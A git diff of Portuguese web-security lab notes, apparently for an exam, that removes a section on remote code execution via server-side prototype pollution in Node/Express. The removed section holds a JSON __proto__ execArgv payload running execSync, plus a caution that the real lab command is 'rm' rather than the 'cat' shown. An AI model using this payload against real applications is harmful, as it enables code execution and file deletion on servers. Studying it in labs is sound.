@@ -93,18 +93,3 @@ Tente esse exploit se você perceber o header `Express framework` ou `X-Powered-
     }
 }
 ```
-
-<br>
-<br>
-
-**Remote Code Execution via Server-Side Prototype Pollution**
-```
-"__proto__": {
-    "execArgv":[
-        "--eval=require('child_process').execSync('cat /home/carlos/morale.txt')"
-    ]
-}
-```
-
-> [!CAUTION]
-> Eu troquei o comando acima de 'rm' para 'cat' de propósito, para evitar que você copie o comando e delete o arquivo secret do exame. Nos laboratórios, de fato você precisará usar o comando 'rm'.
